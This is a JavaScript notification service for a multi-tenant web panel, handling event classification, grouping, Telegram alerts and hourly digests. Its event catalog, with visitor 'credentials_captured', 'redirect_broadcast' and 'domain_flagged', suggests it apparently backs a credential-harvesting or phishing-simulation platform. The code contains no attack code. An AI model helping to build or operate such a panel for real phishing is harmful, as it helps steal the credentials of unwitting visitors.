const { getAdapter } = require('../database/adapter');

let _io = null;
function setIo(io) { _io = io; }
function getIo() { return _io; }

// ─── Event catalog ───────────────────────────────────────────────────────
// Central classification: every known event has a category + default severity.
// Callers pass event: 'foo_bar' and the service fills the rest. Unknown events
// fall back to { category: 'system', severity: 'normal' }.
const EVENT_META = {
  // ── Security (auth, 2FA, sessions, resets) ─────────────────────────────
  failed_login:         { category: 'security', severity: 'high'     },
  user_login:           { category: 'security', severity: 'low'      },
  user_created:         { category: 'security', severity: 'normal'   },
  user_deleted:         { category: 'security', severity: 'high'     },
  role_changed:         { category: 'security', severity: 'high'     },
  user_suspended:       { category: 'security', severity: 'high'     },
  user_reactivated:     { category: 'security', severity: 'normal'   },
  tfa_enabled:          { category: 'security', severity: 'normal'   },
  tfa_disabled:         { category: 'security', severity: 'high'     },
  tfa_reset:            { category: 'security', severity: 'high'     },
  tfa_reset_by_admin:   { category: 'security', severity: 'high'     },
  session_killed:       { category: 'security', severity: 'high'     },
  reset_link_issued:    { category: 'security', severity: 'normal'   },
  password_reset_used:  { category: 'security', severity: 'high'     },
  suspended:            { category: 'security', severity: 'high'     },
  reactivated:          { category: 'security', severity: 'normal'   },

  // ── Tenant (what users do inside their own scope) ──────────────────────
  website_added:        { category: 'tenant',   severity: 'normal'   },
  website_deleted:      { category: 'tenant',   severity: 'high', destructive: true },
  domain_added:         { category: 'tenant',   severity: 'normal'   },
  domain_adopted:       { category: 'tenant',   severity: 'low'      },
  domain_import:        { category: 'tenant',   severity: 'normal'   },
  domain_deleted:       { category: 'tenant',   severity: 'high', destructive: true },
  vps_added:            { category: 'tenant',   severity: 'normal'   },
  vps_removed:          { category: 'tenant',   severity: 'high', destructive: true },

  // ── System (pipeline outcomes, background jobs) ────────────────────────
  domain_flagged:       { category: 'system',   severity: 'critical' },
  domain_live:          { category: 'system',   severity: 'normal'   },
  domain_down:          { category: 'system',   severity: 'high'     },

  // ── Activity (visitor traffic, captures) ───────────────────────────────
  new_visitor:          { category: 'activity', severity: 'low'      },
  credentials_captured: { category: 'activity', severity: 'high'     },
  redirect_broadcast:   { category: 'activity', severity: 'normal'   },
};

// Default routing when a user has no notification_prefs set. Matrix of
// category → { toast, sound, telegram } per severity bucket:
//   silent  = badge only
//   normal  = badge + subtle chime
//   toast   = badge + toast + chime
const DEFAULT_PREFS = {
  security: { low: 'normal', normal: 'toast', high: 'toast', critical: 'toast', telegram: true },
  tenant:   { low: 'silent', normal: 'normal', high: 'toast', critical: 'toast', telegram: true },
  system:   { low: 'silent', normal: 'normal', high: 'toast', critical: 'toast', telegram: true },
  activity: { low: 'silent', normal: 'silent', high: 'normal', critical: 'toast', telegram: false },
};

function _classify(event, overrides = {}) {
  const meta = EVENT_META[event] || {};
  return {
    category:    overrides.category || meta.category || 'system',
    severity:    overrides.severity || meta.severity || 'normal',
    destructive: !!(overrides.destructive || meta.destructive),
  };
}

// ─── Preference matrix ────────────────────────────────────────────────────
async function _readPrefs(userId) {
  try {
    const db = getAdapter();
    const row = await db.get('SELECT notification_prefs, watched_user_ids, telegram_chat_id FROM users WHERE id = ?', [userId]);
    let prefs = DEFAULT_PREFS;
    if (row?.notification_prefs) {
      try {
        const parsed = typeof row.notification_prefs === 'object'
          ? row.notification_prefs
          : JSON.parse(row.notification_prefs);
        // Shallow-merge user overrides on top of defaults so unknown categories still route
        prefs = { ...DEFAULT_PREFS };
        for (const k of Object.keys(parsed || {})) {
          prefs[k] = { ...(DEFAULT_PREFS[k] || {}), ...(parsed[k] || {}) };
        }
      } catch {}
    }
    let watched = [];
    try {
      watched = Array.isArray(row?.watched_user_ids)
        ? row.watched_user_ids
        : JSON.parse(row?.watched_user_ids || '[]');
    } catch { watched = []; }
    return {
      prefs,
      watched: watched.map(Number).filter(n => Number.isFinite(n)),
      telegramChatId: row?.telegram_chat_id || null,
    };
  } catch {
    return { prefs: DEFAULT_PREFS, watched: [], telegramChatId: null };
  }
}

// Return the effective delivery mode for one owner given classification+prefs.
function _deliveryMode(prefs, category, severity, isWatched) {
  // Watched-user override: bumps to at least "toast" if severity < toast
  if (isWatched) return 'toast';
  const cat = prefs[category] || DEFAULT_PREFS[category] || DEFAULT_PREFS.system;
  return cat[severity] || 'normal';
}

// ─── Grouping ─────────────────────────────────────────────────────────────
// Within a 5-min window, if we already wrote a row for the same
// (owner, event, actor) with the same category/severity and it's still unread,
// we increment its count and refresh its timestamp instead of writing a new row.
const GROUP_WINDOW_MS = 5 * 60 * 1000;

function _groupKey(ownerId, event, actorId) {
  return `${ownerId}|${event || 'anon'}|${actorId ?? 'nil'}`;
}

async function _findGroupTarget(db, groupKey) {
  try {
    const row = await db.get(
      `SELECT id, count, created_at, message FROM notifications
        WHERE group_key = ? AND is_read = 0
          AND undone_at IS NULL
        ORDER BY created_at DESC LIMIT 1`,
      [groupKey]
    );
    if (!row) return null;
    const ageMs = Date.now() - new Date(row.created_at).getTime();
    return ageMs < GROUP_WINDOW_MS ? row : null;
  } catch { return null; }
}

// ─── Telegram mirror ──────────────────────────────────────────────────────
async function _mirrorToTelegram(chatId, payload) {
  if (!chatId) return;
  try {
    const tg = require('./telegram');
    if (typeof tg?.sendMessage === 'function') {
      const sev = String(payload.severity || '').toUpperCase();
      const icon = payload.severity === 'critical' ? '🚨'
                 : payload.severity === 'high'     ? '⚠️'
                 : payload.severity === 'normal'   ? 'ℹ️'
                 :                                    '·';
      const body = `${icon} <b>${_escHtml(payload.title || 'Notification')}</b>\n${_escHtml(payload.message || '')}\n<code>${sev} · ${payload.category || 'system'}</code>`;
      await tg.sendMessage(chatId, body, { parse_mode: 'HTML' }).catch(() => {});
    }
  } catch {}
}
function _escHtml(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// ─── Core create ──────────────────────────────────────────────────────────
/**
 * Create (or merge into an existing recent) notification for one owner.
 * Payload:
 *   type      — legacy visual type (info | success | warning | error | alert | session | redirect)
 *   title     — headline
 *   message   — body text
 *   link      — deep link to click through
 *   event     — machine-readable slug; consulted for default category/severity
 *   category  — override; else derived from event
 *   severity  — override; else derived from event
 *   actorId   — user id who caused this (for attribution + grouping)
 *   undo      — { kind, params, expiresInMs? } — writes undo_action and expires_at
 */
async function createNotification(io, ownerId, payload = {}) {
  const socketIo = io || _io;
  if (ownerId == null) {
    console.error('[notification] createNotification called without ownerId — refused');
    return null;
  }
  try {
    const db = getAdapter();
    const {
      type = 'info', title, message, link = null,
      event = null, actorId = null, undo = null,
    } = payload;
    const { category, severity, destructive } = _classify(event, payload);
    const groupKey = event ? _groupKey(ownerId, event, actorId) : null;

    // Skip if the recipient's prefs say "off" for this category/severity via
    // an explicit `off` value (we still write high/critical no matter what).
    let notification;

    // Grouping: only for non-destructive, non-critical events. Destructive
    // rows need their own id + expires_at + undo_action, and critical rows
    // should always alert distinctly.
    let merged = false;
    if (groupKey && !destructive && severity !== 'critical') {
      const existing = await _findGroupTarget(db, groupKey);
      if (existing) {
        const newCount = (existing.count || 1) + 1;
        const newMsg = message && !String(existing.message || '').includes(message)
          ? `${message} (×${newCount})`
          : (existing.message || `${title} (×${newCount})`).replace(/\s\(×\d+\)$/, '') + ` (×${newCount})`;
        await db.run(
          `UPDATE notifications
             SET count = ?, message = ?, created_at = CURRENT_TIMESTAMP, is_read = 0
           WHERE id = ?`,
          [newCount, newMsg, existing.id]
        );
        notification = await db.get('SELECT * FROM notifications WHERE id = ?', [existing.id]);
        merged = true;
      }
    }

    if (!merged) {
      // Compute expires_at for destructive events (10-minute undo window)
      let expiresAtIso = null;
      let undoJson = null;
      if (undo && undo.kind) {
        const ttlMs = undo.expiresInMs || (10 * 60 * 1000);
        expiresAtIso = new Date(Date.now() + ttlMs).toISOString();
        try { undoJson = JSON.stringify({ kind: undo.kind, params: undo.params || {} }); } catch {}
      }

      const result = await db.run(
        `INSERT INTO notifications
          (owner_id, type, title, message, link, category, severity, actor_id, event, group_key, count, expires_at, undo_action, created_at)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, CURRENT_TIMESTAMP)`,
        [ownerId, type, title, message, link, category, severity, actorId, event, groupKey, expiresAtIso, undoJson]
      );
      notification = await db.get('SELECT * FROM notifications WHERE id = ?', [result.lastInsertRowid]);
    }

    // Emit the socket event with routing hints so the frontend knows whether
    // to toast, play a sound, and which chime to use.
    if (socketIo) {
      try {
        const adminNsp = socketIo.of('/admin');
        const { prefs, watched, telegramChatId } = await _readPrefs(ownerId);
        const isWatched = actorId != null && watched.includes(Number(actorId));
        const delivery = _deliveryMode(prefs, category, severity, isWatched);
        const payloadOut = { ...notification, event, category, severity, delivery, merged, watched: isWatched };
        adminNsp.to(`user:${ownerId}`).emit('admin:notification', payloadOut);

        // Mirror high/critical (and any watched-actor event) to Telegram when opted-in
        const catPrefs = prefs[category] || DEFAULT_PREFS[category] || {};
        const mirror = (catPrefs.telegram !== false) && (severity === 'high' || severity === 'critical' || isWatched);
        if (mirror && telegramChatId) _mirrorToTelegram(telegramChatId, payloadOut);
      } catch (e) {}
    }
    return notification;
  } catch (err) {
    console.error('Failed to create/emit notification:', err.message);
    return null;
  }
}

/** Broadcast to every non-deleted god. Excludes actorId by default. */
async function notifyGods(io, payload, { actorId = null, includeActor = false } = {}) {
  try {
    const db = getAdapter();
    let gods;
    try { gods = await db.all(`SELECT id FROM users WHERE role = 'god' AND deleted_at IS NULL`); }
    catch { gods = await db.all(`SELECT id FROM users WHERE role = 'god'`); }
    const targets = gods.map(g => Number(g.id)).filter(id => includeActor || Number(id) !== Number(actorId));
    const out = [];
    for (const id of targets) {
      const n = await createNotification(io, id, { ...payload, actorId });
      if (n) out.push(n);
    }
    return out;
  } catch (err) { console.error('[notification] notifyGods failed:', err.message); return []; }
}

/** Owner + every god (dedup). Skips the actor for their own event. */
async function notifyOwnerAndGods(io, ownerId, payload, { actorId = null } = {}) {
  const seen = new Set();
  const out = [];
  try {
    const db = getAdapter();
    if (ownerId != null && Number(ownerId) !== Number(actorId)) {
      seen.add(Number(ownerId));
      const n = await createNotification(io, ownerId, { ...payload, actorId });
      if (n) out.push(n);
    }
    let gods;
    try { gods = await db.all(`SELECT id FROM users WHERE role = 'god' AND deleted_at IS NULL`); }
    catch { gods = await db.all(`SELECT id FROM users WHERE role = 'god'`); }
    for (const g of gods) {
      const id = Number(g.id);
      if (seen.has(id) || Number(id) === Number(actorId)) continue;
      seen.add(id);
      const n = await createNotification(io, id, { ...payload, actorId });
      if (n) out.push(n);
    }
    return out;
  } catch (err) { console.error('[notification] notifyOwnerAndGods failed:', err.message); return out; }
}

async function actorLabel(actorId) {
  if (actorId == null) return 'Someone';
  try {
    const db = getAdapter();
    const row = await db.get('SELECT username, role FROM users WHERE id = ?', [Number(actorId)]);
    if (!row) return `user #${actorId}`;
    const roleTag = row.role === 'god' ? ' (god)' : row.role === 'super_admin' ? ' (super)' : '';
    return `${row.username}${roleTag}`;
  } catch { return `user #${actorId}`; }
}

// ─── Hourly digest ────────────────────────────────────────────────────────
// Collapses every low-severity notification per owner in the last hour into
// one summary row. Run this on an interval from server.js.
async function runHourlyDigest(io) {
  try {
    const db = getAdapter();
    // Any low-severity, unread, un-digested row older than 1h qualifies.
    const cutoff = new Date(Date.now() - 60 * 60 * 1000).toISOString();
    const rows = await db.all(`
      SELECT owner_id, category, COUNT(*) as cnt, MAX(created_at) as newest
        FROM notifications
       WHERE severity = 'low' AND is_read = 0
         AND (event IS NULL OR event <> 'digest')
         AND created_at < ?
       GROUP BY owner_id, category
       HAVING cnt >= 3`,
      [cutoff]
    );
    for (const r of rows) {
      // Mark all included rows as read so they don't get digested again
      await db.run(
        `UPDATE notifications SET is_read = 1
          WHERE owner_id = ? AND category = ? AND severity = 'low' AND created_at < ?`,
        [r.owner_id, r.category, cutoff]
      );
      await createNotification(io || _io, r.owner_id, {
        type: 'info', event: 'digest',
        category: r.category, severity: 'normal',
        title: `Quiet-hour digest — ${r.cnt} ${r.category} events`,
        message: `${r.cnt} low-severity ${r.category} notifications from the past hour were collapsed. Click to review.`,
        link: '/notifications',
      });
    }
    return rows.length;
  } catch (err) {
    console.error('[notification] digest failed:', err.message);
    return 0;
  }
}

module.exports = {
  createNotification,
  notifyGods,
  notifyOwnerAndGods,
  actorLabel,
  runHourlyDigest,
  EVENT_META,
  DEFAULT_PREFS,
  setIo,
  getIo,
};
